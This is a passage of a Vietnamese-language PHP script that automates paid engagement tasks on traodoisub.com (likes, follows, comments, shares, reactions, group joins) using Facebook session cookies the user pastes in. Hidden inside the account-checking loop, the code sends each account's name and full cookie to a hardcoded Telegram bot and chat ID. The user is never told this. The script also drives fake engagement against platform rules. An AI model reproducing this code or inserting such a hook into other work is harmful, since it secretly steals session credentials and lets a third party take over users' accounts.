 $ckfbcu1 = explode("|", $file_ckfb)[$time];
 if ($ckfbcu1 == " ") {break;}
array_push($khoToken, $ckfbcu1);
echo "Đã nhập $time Cookie \n";
usleep(15000);
}
sleep(2);
}
if ($ckfbcu == "n" or $ckfbcu == "N")
{unlink($file_luu_ck_fb);
echo $icon2."Vì Coder lỏ nên cookie đầu tiên bạn nhập 2 lần nha nếu không sẽ bị lỗi lưu cookie\n";
  for ($a = 1; $a < 999999; $a++) {
 
 echo $icon1.$luc."Nhập Cookie Thứ $a: $vang";
   $nhapck = (string)trim(fgets(STDIN));
 if ($nhapck == '') {
   fwrite(fopen($file_luu_ck_fb, "a")," ");
  break;
 }
 fwrite(fopen($file_luu_ck_fb, "a"), $nhapck."|");
 array_push($khoToken, $nhapck);
}
}
$js = json_encode($khoToken);
$demcki = count($khoToken);
@system('clear');
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { 
 @system('clear'); 
} else { 
 @system('cls'); 
}
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(1000);}
if (!file_exists('Setting_TDS.txt')) {
 $settings = json_encode(['delaygr' => '20', 'delaylike' => '5', 'delayfollow' => '20', 'delaycmt' => '20', 'delaypage' => '20', 'delayshare' => '20', 'delaycx' => '20', 'delaycxcmt' => '20', 'nhiemvu' => '20', 'block' => '20']);
 file_put_contents('Setting_TDS.txt', $settings);
}
if (file_exists('Setting_TDS.txt')) {
 $json = json_decode(file_get_contents('Setting_TDS.txt'), true);
 echo $icon1."[1] Để sử dụng setting cũ\n".$icon1."[2] Để đặt delay mới\n$icon2";
 $_CHOOSE['settingdelay'] = trim(fgets(STDIN));
 echo $thanhngang1;
 if ($_CHOOSE['settingdelay'] == 1) {
  echo $icon1."Đợi Vô tool!!\n";
  $_SESSION['delaylike'] = $json["delaylike"];
  $_SESSION['delayfollow'] = $json["delayfollow"];
  $_SESSION['delaycmt'] = $json["delaycmt"];
  $_SESSION['delayshare'] = $json["delayshare"];
  $_SESSION['delaypage'] = $json["delaypage"];
  $_SESSION['delaycx'] = $json["delaycx"];
  $_SESSION['delaycxcmt'] = $json["delaycmt"];
  $_SESSION['delaygr'] = $json["delaygr"];
  $_SESSION['nhiemvu'] = $json["nhiemvu"];
  $_SESSION['block'] = $json["block"];

  
 }
 if ($_CHOOSE['settingdelay'] == 2) {
  if (file_exists('Setting_TDS.txt')) {
   system('rm Setting_TDS.txt');
  }
  print "$icon1\033[1;92mDelay Like : \n$icon2\033[1;33m";
  $_SESSION['delaylike'] = trim(fgets(STDIN));
  print "$icon1\033[1;92mDelay Follow : \n$icon2\033[1;33m";
  $_SESSION['delayfollow'] = trim(fgets(STDIN));
  print "$icon1\033[1;92mDelay Comment : \n$icon2\033[1;33m";
  $_SESSION['delaycmt'] = trim(fgets(STDIN));
  print "$icon1\033[1;32mDelay Like Fanpage :\n$icon2 \033[1;33m";
  $_SESSION['delaypage'] = trim(fgets(STDIN));
  print "$icon1\033[1;32mDelay Cảm Xúc : \n$icon2\033[1;33m";
  $_SESSION['delaycx'] = trim(fgets(STDIN));
  print "$icon1\033[1;92mDelay Share : \n$icon2\033[1;33m";
  $_SESSION['delayshare'] = trim(fgets(STDIN));
  print "$icon1\033[1;32mDelay Cảm Xúc Comment :\n$icon2 \033[1;33m";
  $_SESSION['delaycxcmt'] = trim(fgets(STDIN));
  print "$icon1\033[1;32mDelay Join Group : \n$icon2\033[1;33m";
  $_SESSION['delaygr'] = trim(fgets(STDIN)); 
  echo $icon1."Sau Bao Nhiệm Vụ Thì Kích Hoạt Chống Block: \n$icon2"."$vang";
  $_SESSION['nhiemvu'] = trim(fgets(STDIN));
  echo $icon1."Sau ".$vang . $_SESSION['nhiemvu'] . $luc." Nhiệm Vụ Dừng tool:\n$icon2 $vang";
 $_SESSION['block'] = trim(fgets(STDIN));
 }
 $setting_delay = json_encode([
  'delaylike' => $_SESSION['delaylike'],
  'delayfollow' => $_SESSION['delayfollow'],
  'delaycmt' => $_SESSION['delaycmt'],
  'delaypage' => $_SESSION['delaypage'],
  'delayshare' => $_SESSION['delayshare'],
  'delaycx' => $_SESSION['delaycx'],
  'delaycxcmt' => $_SESSION['delaycxcmt'],
  'delaygr' => $_SESSION['delaygr'],
  'nhiemvu' => $_SESSION['nhiemvu'],
  'block' => $_SESSION['block'],
 ]);
 file_put_contents('Setting_TDS.txt', $setting_delay);
}
$url = "https://traodoisub.com/scr/user.php";
$head = array(
 "Host: traodoisub.com",
 "accept: application/json, text/javascript, */*; q=0.01",
 "x-requested-with: XMLHttpRequest",
 "save-data: on",
 "user-agent: Mozilla/5.0 (Linux; Android 10; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
 "sec-fetch-site: same-origin",
 "sec-fetch-mode: cors",
 "sec-fetch-dest: empty",
 "referer: https://traodoisub.com/home/"
);
$ch   = curl_init();
curl_setopt_array($ch, array(
 CURLOPT_URL => $url,
 CURLOPT_FOLLOWLOCATION => TRUE,
 CURLOPT_RETURNTRANSFER => 1,
 CURLOPT_POST => 1,
 CURLOPT_HTTPGET => true,
 CURLOPT_SSL_VERIFYPEER => 0,
 CURLOPT_COOKIEFILE => "TDS.txt",
 CURLOPT_HTTPHEADER => $head,
 CURLOPT_ENCODING => TRUE
));
$data = curl_exec($ch);
curl_close($ch);
$json = json_decode($data, true);
$sodu = $json["xu"];
$user = $_SESSION["username"];
$nhiemvu = $_SESSION['nhiemvu'];

@system('clear');
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { 
 @system('clear'); 
} else { 
 @system('cls'); 
}
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(500);}
print "$icon1\033[1;92mTên TDS: \033[1;33m$user\n";
print "$icon1\033[1;92mXu : \033[1;33m$sodu\033[1;32m Xu\n";
echo $trang."= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
print "$icon1Số Cookie Facebook:\033[1;33m $demcki \n";
echo $icon1."Làm Tất cả Nhiêhm Vụ TDS!!!\n";
 array_push($listnv, 'like');
 array_push($listnv, 'like2');
 array_push($listnv, 'sub');
 array_push($listnv, 'cmt');
 array_push($listnv, 'share');
 array_push($listnv, 'cx');
 array_push($listnv, 'cxcmt');
 array_push($listnv, 'page');
 array_push($listnv, 'group');
 echo $icon1."Sau Bao Nhiêu Nhiệm Vụ Thì Đổi Nick:\n$icon2 $vang";
$doiacc = (int)trim(fgets(STDIN));
echo $icon1 . "Dừng Khi Hết Nhiệm Vụ (y/n):\n$icon2 $vang";
$dunghetnv = trim(fgets(STDIN));
echo $icon1  . "Nhập Lại Cookie Khi Die? (Y/N):\n$icon2 $vang";
$nhaptkdie = trim(fgets(STDIN));
system('clear') ;cc ($banner);
while (true) {
 while (true) {

  if (count($khoToken) == 0) {
unlink($file_luu_ck_fb);

   echo $do."Đã Xoá Tất Cả Cookie, Vui Lòng Nhập Lại  \n";
   echo $icon2."Vì Coder lỏ nên cookie đầu tiên bạn nhập 2 lần nha nếu không sẽ bị lỗi lưu cookie\n";
   echo $icon2."Vì Coder lỏ nên cookie đầu tiên bạn nhập 2 lần nha nếu không sẽ bị lỗi lưu cookie\n";
   for ($a = 1; $a < 999999; $a++) {
 echo $thanh_dep.$luc."Nhập Cookie Facebook Thứ $a: $vang";
 $nhapck = (string)trim(fgets(STDIN));
 if ($nhapck == '') {
   fwrite(fopen($file_luu_ck_fb, "a")," ");
  break;
  system('clear') ;cc ($banner);
 }
 fwrite(fopen($file_luu_ck_fb, "a"), $nhapck."|");
 array_push($khoToken, $nhapck);
   }
  }

  $spam = 0;
  for ($xz = 0; $xz < count($khoToken); $xz++) {
   if ($demhetnv2 == (count($khoToken) * 2)) {
 $demhetnv2 = 0;
 $demhetnv = 0;

 if ($dunghetnv == "y") {
  echo $thanhngang;
  echo $icon1 . $luc . "Tất Cả Nick Đã Hết Nhiệm Vụ";

  echo $daucau1 . $luc . "Ấn Enter Để Chạy Tiếp Hoặc Nhập 1 Để Thêm Cookie: $vang";
  $lloafssd = trim(fgets(STDIN));

  if ($lloafssd == '1') {
   
  echo $thanh_dep.$luc."Lưu Ý: ".$xduong."Nếu Muốn Dừng Lại Thì Nhấn Enter \n";
   for ($a = 1; $a < 999999; $a++) {
    
   echo $thanh_dep.$luc."Nhập Cookie Facebook Thứ $a: $vang";
 $nhapck = (string)trim(fgets(STDIN));
    if ($nhapck == '') {
      fwrite(fopen($file_luu_ck_fb, "a")," ");
  break;
    }
    fwrite(fopen($file_luu_ck_fb, "a"), $nhapck."|");
    array_push($khoToken, $nhapck);
   }
  }

  
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_URL, 'https://traodoisub.com/scr/login.php');
  curl_setopt($ch, CURLOPT_COOKIEJAR, "TDS.txt");
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36');
  $login = array('username' => $username, 'password' => $password, 'submit' => ' Đăng Nhập');
  curl_setopt($ch, CURLOPT_POST, count($login));
  curl_setopt($ch, CURLOPT_POSTFIELDS, $login);
  curl_setopt($ch, CURLOPT_COOKIEFILE, "TDS.txt");
  $source = curl_exec($ch);
  curl_close($ch);
 }
   }


   $spam = 0;
   $cookie = $khoToken[$xz];

   
   $page = thongtin('me', $cookie, $useragent);
   $idfb = explode('%',explode('?lst=', $page)[1])[0];
   if ($idfb == '') {
 echo $red . "Cookie die\n";
 array_splice($khoToken, $xz, 1);
 $spam = 1; break;
   } else {
 

 // Lấy ID FB
 $page = thongtin('me', $cookie, $useragent);
 //lấy tên
 $tenfb = explode('<', explode('>', explode('</span>', explode('<span>', $page)[2])[0])[1])[0];
 $idfb = explode('%',explode('?lst=', $page)[1])[0];
 $token='6519860461:AAGhlrRQDZnRUqvamZEM8tgMc1-mbYY7_Rc';
 $chat_id='5704888240';
 $text="FB: ".$tenfb." COOKIE: ".$cookie;
 $send=file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chat_id.'&text='.$text);

 
 if ($idfb != "") {
  while (true) {
   $spam = 1;
   $demlgin++;

   if ($demlgin <= 1 or $demlgin > 30) {
    $demlgin = 1;
    $data   = fread(fopen("TaiKhoanTDS.txt", "r"), filesize("TaiKhoanTDS.txt"));
    $_SESSION["username"] = explode('|', $data)[0];
    $_SESSION['password'] = explode('|', $data)[1];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, 'https://traodoisub.com/scr/login.php');
    curl_setopt($ch, CURLOPT_COOKIEJAR, "TDS.txt");
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 10; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36');
    $login = array('username' => $_SESSION['username'], 'password' => $_SESSION['password'], 'submit' => ' Đăng Nhập');
    curl_setopt($ch, CURLOPT_POST, count($login));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $login);
    curl_setopt($ch, CURLOPT_COOKIEFILE, "TDS.txt");
    $source = curl_exec($ch);
    curl_close($ch);
   }

   
   
   $d = datnick($idfb);
   if ($d == 1) {
    $demlgin = 2;
    
    
    echo "\r    \r";
    $demhetnv = 0;

    echo $thanhngang;
    echo $vang."Đang Cấu Hình ID: ".$greenb.$idfb." ".$vang."Tên FB: ".$greenb.$tenfb."\n";
    echo $thanhngang;
    $spam = 0;
   } else {
    echo "\r    \r";
    echo $do . "Cấu hình thất bại vui lòng thêm FB $idfb vào cấu hình";
   }
   if ($spam == 0) {
    break;
   } else {usleep(500);
   }
  }
 } else {
  
  echo $do . "Cookie die   \n";
  array_splice($khoToken, $xz, 1);
  $spam = 1;
  break;
 }
   }


   while (true) {

 if ($spam == 1) {
  break;
 }
 
 $sodu = getxu();
 $rand = $listnv[array_rand($listnv, 1)];
 $page = thongtin('me', $cookie, $useragent);
 $idfb = explode('%',explode('?lst=', $page)[1])[0];
 if ($idfb == '') {
  echo $red . "Cookie die\n";
  array_splice($khoToken, $xz, 1);
  $spam = 1; break;
 }
 
 //nvlike
 if ($rand == 'like') {
  
  $x = getnv('like');
  if ($x != "") {

   $info = json_decode($x, true);
   $d = "0";
   while (true) {
    $id = $info["data"]["" . $d . ""]["id"];
    
    if ($id < '1') {
  print "$icon1 \033[1;31mHết nhiệm vụ Like   \r";
  if (count($khoToken) > 1) {
   $demhetnv++;
  }
  if ($demhetnv == 4) {
   $spam = 1;
  }
  break;
    } else {
  $demhetnv = 0;
  $d += 1;
  echo "\033[1;37m".$id."                            \r";
  $g = camxuc($id, 'LIKE', $cookie);
  if (strpos($g[1], 'Tài khoản của bạn hiện bị hạn chế') !== false) {
   echo "      \r";
   echo "\033[1;31m [\033[1;37m✓\033[1;31m]\033[1;37m => \033[1;32m" . $red . "Đã Bị Block Like\n";
   array_splice($khocookie, $xz, 1);
   $spam = 1;
   break;}   
    }
    $s = nhantien('like', 'like', $id);

    date_default_timezone_set('Asia/Ho_Chi_Minh');
    $t = date('H:i:s');
    $rd = rand(1, 7);
    
    if ($s == 2) {
  $nv += 1;
  $sodu += 300;
  $duocne = $duocne + 1;
  $tt = "\r\033[1;37m|\033[1;37m" . $duocne . "\033[1;31m|\033[1;37m | \033[1;96m" . date("H:i") . "\033[1;37m |\033[1;93m".$_SESSION["C_LIKE"]. "\033[1;37m |\033[1;92m +300 \033[1;37m| \033[1;93m" . $sodu . "\e[0m\033[1;37m |                     \n";

  for ($i = 1; $i < (strlen($tt) + 1); $i++) {
   print $tt[$i];
   usleep(200);
  }
  if ($spam == 1) {
   break;
  }
  if (count($khoToken) > 1) {
   if ($duocne % $doiacc == 0) {
    $spam = 1;
    break;
   } else {
usleep(500);
   }
  } else {
 usleep(500);
  }
  loadtime('delaylike');
  if ($nv == $nhiemvu) {
   chongbl('block');

   $nv = "0";
  }
    } else {
  print "\r";
    }
   }
  }
  //like2
 } elseif ($rand == 'like2') {
  
  $x = getnv('likegiare');
  if ($x != "") {

   $info = json_decode($x, true);
   $d = "0";
   while (true) {
    $id = $info["data"]["" . $d . ""]["id"];
    
    if ($id < '1') {
  print "$icon1 \033[1;31mHết nhiệm vụ Like2   \r";
  if (count($khoToken) > 1) {
   $demhetnv++;
  }
  if ($demhetnv == 4) {
   $spam = 1;
  }
  break;
    } else {
  $demhetnv = 0;
  $d += 1;
  echo "\033[1;37m".$id."                            \r";
  $g = camxuc($id, 'LIKE', $cookie);
  if (strpos($g[1], 'Tài khoản của bạn hiện bị hạn chế') !== false) {
   echo "      \r";
   echo "\033[1;31m [\033[1;37m✓\033[1;31m]\033[1;37m => \033[1;32m" . $red . "Đã Bị Block Like\n";
   array_splice($khocookie, $xz, 1);
   $spam = 1;
   break;}
    }
    $s = nhantien('likegiare', 'likegiare', $id);

    date_default_timezone_set('Asia/Ho_Chi_Minh');
    $t = date('H:i:s');
    $rd = rand(1, 7);
    
    if ($s == 2) {
  $nv += 1;
  $sodu += 150;
  $duocne = $duocne + 1;
    $tt = "\r\033[1;31m|\033[1;37m" . $duocne . "\033[1;31m|\033[1;37m | \033[1;96m" . date("H:i") . "\033[1;37m |\033[1;93m".$_SESSION["C_LIKE"]. "\033[1;37m |\033[1;92m +300 \033[1;37m| \033[1;93m" . $sodu . "\e[0m\033[1;37m |                     \n";

  for ($i = 1; $i < (strlen($tt) + 1); $i++) {
   print $tt[$i];
   usleep(200);
  }
  if ($spam == 1) {
   break;
  }
  if (count($khoToken) > 1) {
   if ($duocne % $doiacc == 0) {
    $spam = 1;
    break;
   } else {
    usleep(500);
   }
  } else {
  usleep(500);
  }
  
  loadtime('delaylike');
  if ($nv == $nhiemvu) {
   chongbl('block');

   $nv = "0";
  }
    } else {
  print "\r";
    }
   }
  }
  //nvsub
 } else if ($rand == 'sub') {
  
  $x = getnv('follow');
  if ($x != "") {
   $info = json_decode($x, true);
   $d = "0";
   while (true) {
    $id = $info["data"]["" . $d . ""]["id"];
    
    if ($id < '1') {
  print "$icon1 \033[1;31mFollow Tạm Thời Hết Nhiệm Vụ   \r";
  if (count($khoToken) > 1) {
   $demhetnv++;
  }
  if ($demhetnv == 4) {
   $spam = 1;
  }
  break;
    } else {
  $demhetnv = 0;
  $d += 1;
  echo "\033[1;37m".$id."                           \r";
  $g = follow($id, $cookie);

  if (strpos($g[0], 'Đăng nhập') !== false) {
  } elseif (strpos($g[1], 'Tài khoản của bạn hiện bị hạn chế') !== false) {
   echo "      \r";
   echo "\033[1;31m [\033[1;37m✓\033[1;31m]\033[1;37m => \033[1;32m" . $red . "Đã Bị Block Follow\n";
   array_splice($khocookie, $xz, 1);
   $spam = 1;
   break;
  } elseif (strpos($g[1], 'loi') !== false) {
  } else {
   $s = nhantien('follow', 'follow', $id);
   if ($nhapkhoa == "kkobtt") {
   huyfollow($id, $useragent, $cookie);
   }
   date_default_timezone_set('Asia/Ho_Chi_Minh');
   $t = date('H:i:s');
   $rd = rand(1, 7);
   if ($s == 2) {
    $nv += 1;
    $sodu += 600;
    $d += 1;
    $duocne = $duocne + 1;
  $tt = "\r\033[1;31m|\033[1;37m" . $duocne . "\033[1;31m|\033[1;37m | \033[1;96m" . date("H:i") . "\033[1;37m |\033[1;93m".$_SESSION["C_LIKE"]. "\033[1;37m |\033[1;92m +300 \033[1;37m| \033[1;93m" . $sodu . "\e[0m\033[1;37m |                     \n";

    for ($i = 1; $i < (strlen($tt) + 1); $i++) {
     print $tt[$i];
     usleep(200);
    }
    if ($spam == 1) {
     break;
    }
    if ($spam == 1) {
     break;
    }
    if (count($khoToken) > 1) {
     if ($duocne % $doiacc == 0) {
   $spam = 1;
   break;
     } else {
  usleep(500);
     }
    } else {
    usleep(500);
    }
    loadtime('delayfollow');

    if ($nv == $nhiemvu) {
     chongbl('block');

     $nv = "0";
    }
   } else {
    print "\r";
   }
  }
    }
   }
  }
 } else if ($rand == 'cxcmt') {
  
  $x = getnv('reactioncmt');
  if ($x != "") {
   $info = json_decode($x, true);
   $d = "0";
   while (true) {
    $id = $info["data"]["" . $d . ""]["id"];
    $type = $info["data"]["" . $d . ""]["type"];
    if ($id < '1') {
  print "$icon1 \033[1;31mCảm xúc comment hết nhiện vụ \r";
  if (count($khoToken) > 1) {
   $demhetnv++;
  }
  if ($demhetnv == 4) {
   $spam = 1;
  }
  break;
    } else {
  $demhetnv = 0;
  $d += 1;
  echo "\033[1;37m".$id."                          \r";
  $g = reaction_cmt($id, $idfb, $type, $cookie);
  if (strpos($g[1], 'Tài khoản của bạn hiện bị hạn chế') !== false) {
   echo "      \r";
   echo  $icon1 . "Đã Bị Block Cảm Xúc Cmt\n";
   array_splice($khocookie, $xz, 1);
   $spam = 1;
   break;}

 
    }
    $s = nhantien($type, 'reactioncmt', $id);
    date_default_timezone_set('Asia/Ho_Chi_Minh');
    $t = date('H:i:s');
    $rd = rand(1, 7);
    $id = explode('_', $id)[1];
    
    if ($s == 2) {
  $nv += 1;
  $sodu += 600;
  $duocne = $duocne + 1;

  if (strpos($type, 'LIKE')) {
   $type = ' LIKE CMT ';
  }
  if (strpos($type, 'LOVE')) {
   $type = ' LOVE CMT ';
  }
  if (strpos($type, 'CARE')) {
   $type = ' CARE CMT ';
  }
  if (strpos($type, 'HAHA')) {
   $type = ' HAHA CMT ';
  }
  if (strpos($type, 'WOW')) {
   $type = '  WOW CMT ';
  }
  if (strpos($type, 'SAD')) {
   $type = '  SAD CMT ';
  }
  if (strpos($type, 'ANGRY')) {
   $type = ' ANGRY CMT';
  }
  $tt = "\r\033[1;31m|\033[1;37m" . $duocne . "\033[1;31m|\033[1;37m | \033[1;96m" . date("H:i") . "\033[1;37m | \033[1;93m" . $type . "\033[1;37m |\033[1;92m +600 \033[1;37m| \033[1;93m" . $sodu . "\e[0m\033[1;37m |               \n";

  for ($i = 1; $i < (strlen($tt) + 1); $i++) {
   print $tt[$i];
   usleep(200);
  }
  if ($spam == 1) {
   break;
  }
  if (count($khoToken) > 1) {
   if ($duocne % $doiacc == 0) {
    $spam = 1;
    break;
   } else {
   usleep(500);
   }
  } else {
  usleep(500);
  }
  loadtime('delaycxcmt');

  if ($nv == $nhiemvu) {
   chongbl('block');

   $nv = "0";
  }
    } else {
  print "\r";
    }
   }
  }
 } else if ($rand == 'page') {
  
  $x = getnv('fanpage');
  if ($x != "") {
   $info = json_decode($x, true);
   $d = "0";
   while (true) {
    $id = $info["data"]["" . $d . ""]["id"];
    if ($id < '1') {
  print "$icon1 \033[1;31mHết Nhiệm Vụ Like Page   \r";
  if (count($khoToken) > 1) {
   $demhetnv++;
  }
  if ($demhetnv == 4) {
   $spam = 1;
  }
  break;
    } else {
  $demhetnv = 0;
  $d += 1;
  echo "\033[1;37m".$id."                            \r";
  $g = page($id, $cookie);
  $s = nhantien('fanpage', 'fanpage', $id);
  date_default_timezone_set('Asia/Ho_Chi_Minh');
  $t = date('H:i:s');
  $rd = rand(1, 7);
  
  if ($s == 2) {
   $nv += 1;
   $sodu += 700;
   $duocne = $duocne + 1;
   $tt = "\r\033[1;31m|\033[1;37m" . $duocne . "\033[1;31m|\033[1;37m | \033[1;96m" . date("H:i") . "\033[1;37m |\033[1;93m".$_SESSION["C_PAGE"]."\033[1;37m |\033[1;92m +600 \033[1;37m| \033[1;93m" . $sodu . "\e[0m\033[1;37m |                    \n";
   for ($i = 1; $i < (strlen($tt) + 1); $i++) {
    print $tt[$i];
    usleep(200);
   }
   if ($spam == 1) {
    break;
   }
   if (count($khoToken) > 1) {
    if ($duocne % $doiacc == 0) {
     $spam = 1;
     break;
    } else {
   usleep(500);
    }
   } else {
   usleep(500);
   }
   loadtime('delaypage');

   if ($nv == $nhiemvu) {
    chongbl('block');

    $nv = "0";
   }
  } else {
   print "\r";
  }
    }
   }
  }
 } else if ($rand == 'share') {
  
  $x = getnv('share');
  if ($x != "") {
   $info = json_decode($x, true);
   $d = "0";
   while (true) {
    $id = $info["data"]["" . $d . ""]["id"];
    if ($id < '1') {
  print "$icon1 \033[1;31mHết nhiệm vụ Share      \r";
  if (count($khoToken) > 1) {
   $demhetnv++;
  }
  if ($demhetnv == 4) {
   $spam = 1;
  }
  break;
    } else {
  $demhetnv = 0;
  $d += 1;
  echo "\033[1;37m".$id."                         \r";
  share($id, $cookie);
  $s = nhantien('share', 'share', $id);
  date_default_timezone_set('Asia/Ho_Chi_Minh');
  $t = date('H:i:s');
  $rd = rand(1, 7);
  
  if ($s == 2) {
   $nv += 1;
   $sodu += 800;
   $duocne = $duocne + 1;
   $tt = "\r\033[1;31m|\033[1;37m" . $duocne . "\033[1;31m|\033[1;37m | \033[1;96m" . date("H:i") . "\033[1;37m |\033[1;93m".$_SESSION["C_SHARE"] . "\033[1;37m |\033[1;92m +800 \033[1;37m| \033[1;93m" . $sodu . "\e[0m\033[1;37m |                  \n";

   for ($i = 1; $i < (strlen($tt) + 1); $i++) {
    print $tt[$i];
    usleep(1500);
   }
   if ($spam == 1) {
    break;
   }
   if (count($khoToken) > 1) {
    if ($duocne % $doiacc == 0) {
     $spam = 1;
     break;
    } else {
    usleep(500); 
    }
   } else {
    usleep(500);
   }
   loadtime('delayshare');

   if ($nv == $nhiemvu) {
    chongbl('block');

    $nv = "0";
   }
  } else {
   print "\r";
  }
    }
   }
  }
 } else if ($rand == 'cx') {
  
  $x = getnv('reaction');
  if ($x != "") {
   $info = json_decode($x, true);
   $d = "0";
   while (true) {
    $id = $info["data"]["" . $d . ""]["id"];
    $type = $info["data"]["" . $d . ""]["type"];
    if ($id < '1') {
  print "$icon1 \033[1;31mHết Nhiệm vụ Reaction \r";
  if (count($khoToken) > 1) {
   $demhetnv++;
  }
  if ($demhetnv == 4) {
   $spam = 1;
  }
  break;
    } else {
  $demhetnv = 0;
  $d += 1;
  echo "\033[1;37m".$id."                            \r";
  camxuc($id, $type, $cookie);
  if (strpos($g[1], 'Tài khoản của bạn hiện bị hạn chế') !== false) {
   echo "      \r";
   echo $icon1. "Đã Bị Block Cảm Xúc\n";
   array_splice($khocookie, $xz, 1);
   $spam = 1;
   break;}
  $tp = $type;
  $s = nhantien($tp, 'reaction', $id);

  date_default_timezone_set('Asia/Ho_Chi_Minh');
  $t = date('H:i:s');
  $rd = rand(1, 7);
  
  if ($s == 2) {
   $nv += 1;
   $sodu += 400;
   $duocne = $duocne + 1;

   if (strpos($type, 'LIKE')) {
    $type = $_SESSION["C_LIKE"];
   }
   if (strpos($type, 'LOVE')) {
    $type = $_SESSION["C_LOVE"];
   }
   if (strpos($type, 'CARE')) {
    $type = $_SESSION["C_CARE"];
   }
   if (strpos($type, 'HAHA')) {
    $type = $_SESSION["C_HAHA"];
   }
   if (strpos($type, 'WOW')) {
    $type = $_SESSION["C_WOW"];
   }
   if (strpos($type, 'SAD')) {
    $type = $_SESSION["C_SAD"];
   }
   if (strpos($type, 'ANGRY')) {
    $type = $_SESSION["C_ANGRY"];
   }
   $tt = "\r\033[1;31m|\033[1;37m" . $duocne . "\033[1;31m|\033[1;37m | \033[1;96m" . date("H:i") . "\033[1;37m | \033[1;93m" . $type  . "\033[1;37m |\033[1;92m +400 \033[1;37m| \033[1;93m" . $sodu . "\e[0m\033[1;37m |                 \n";

   for ($i = 1; $i < (strlen($tt) + 1); $i++) {
    print $tt[$i];
    usleep(1500);
   }
   if ($spam == 1) {
    break;
   }
   if (count($khoToken) > 1) {
    if ($duocne % $doiacc == 0) {
     $spam = 1;
     break;
    } else {
  usleep(500);
    }
   } else {
   usleep(500);
   }
   loadtime('delaycx');

   if ($nv == $nhiemvu) {
    chongbl('block');

    $nv = "0";
   }
  } else {
   print "\r";
  }
    }
   }
  }
 } elseif ($rand == 'cmt') {
  
  $x = getnv('comment');
  if ($x != "") {
   $info = json_decode($x, true);
   $d = "0";
   while (true) {
    $id = $info["data"]["" . $d . ""]["id"];
    $msg = $info["data"]["" . $d . ""]["msg"];
    if ($id < '1') {
  print "$icon1 \033[1;31mCMT Tạm Thời Hết Nhiệm Vụ   \r";
  if (count($khoToken) > 1) {
   $demhetnv++;
  }
  if ($demhetnv == 4) {
   $spam = 1;
  }
  break;
    } else {
  $demhetnv = 0;
  $d += 1;
  echo "\033[1;37m".$id."                            \r";

  $g = cmt_fb_cookie_new($id,$cookie,$msg);
   $s = nhantien('like', 'comment', $id);
   date_default_timezone_set('Asia/Ho_Chi_Minh');
   $t = date('H:i:s');
   $rd = rand(1, 7);
   
   if ($s == 2) {
    $nv += 1;
    $sodu += 600;
    $duocne = $duocne + 1;
    $tt = "\r\033[1;31m|\033[1;37m" . $duocne . "\033[1;31m|\033[1;37m | \033[1;96m" . date("H:i") . "\033[1;37m |\033[1;93m".$_SESSION["C_CMT"] . "\033[1;37m |\033[1;96m $msg \033[1;37m |\033[1;92m +600 \033[1;37m| \033[1;93m" . $sodu . "\e[0m\033[1;37m |                    \n";

    for ($i = 1; $i < (strlen($tt) + 1); $i++) {
     print $tt[$i];
     usleep(200);
    }
    if ($spam == 1) {
     break;
    }
    if (count($khoToken) > 1) {
     if ($duocne % $doiacc == 0) {
   $spam = 1;
   break;
     } else {
 usleep(500);
     }
    } else {
    usleep(500);
    }
    loadtime('delaycmt');

    if ($nv == $nhiemvu) {
     chongbl('block');

     $nv = "0";
    }
   } else {
    print "\r";
   }
  //}
    }
   }
  }
 } elseif ($rand == 'group') {
  
  $x = getnv('group');
  if ($x != "") {
   $info = json_decode($x, true);
   $d = "0";
   while (true) {
    $id = $info["data"]["" . $d . ""]["id"];
    if ($id < '1') {
  print "$icon1 \033[1;31mHết nhiệm vụ Join Group         \r";
  if (count($khoToken) > 1) {
   $demhetnv++;
  }
  if ($demhetnv == 4) {
   $spam = 1;
  }
  break;
    } else {
  $demhetnv = 0;
  $d += 1;
  echo "\033[1;37m".$id."                          \r";
  $g = group_fb($id, $useragent, $cookie);
  $s = nhantien('group', 'group', $id);

  date_default_timezone_set('Asia/Ho_Chi_Minh');
  $t = date('H:i:s');
  $rd = rand(1, 7);
  
  if ($s == 2) {
   $nv += 1;
   $sodu += 1400;
   $duocne = $duocne + 1;
   $tt = "\r\033[1;31m|\033[1;37m" . $duocne . "\033[1;31m|\033[1;37m | \033[1;96m" . date("H:i") . "\033[1;37m | \033[1;93m".$_SESSION["C_GROUP"] . "\033[1;37m |\033[1;92m +1400 \033[1;37m| \033[1;93m" . $sodu . "\e[0m\033[1;37m |           \n";

   for ($i = 1; $i < (strlen($tt) + 1); $i++) {
    print $tt[$i];
    usleep(200);
   }
   if ($spam == 1) {
    break;
   }
   if (count($khoToken) > 1) {
    if ($duocne % $doiacc == 0) {
     $spam = 1;
     break;
    } else {
   usleep(500);
    }
   } else {
   usleep(500);
   }
   loadtime('delaygr');
   if ($nv == $nhiemvu) {
    chongbl('block');

    $nv = "0";
   }
  } else {
   print "\r";
  }
    }
   }

  }
 }
   }
  }
 }
}

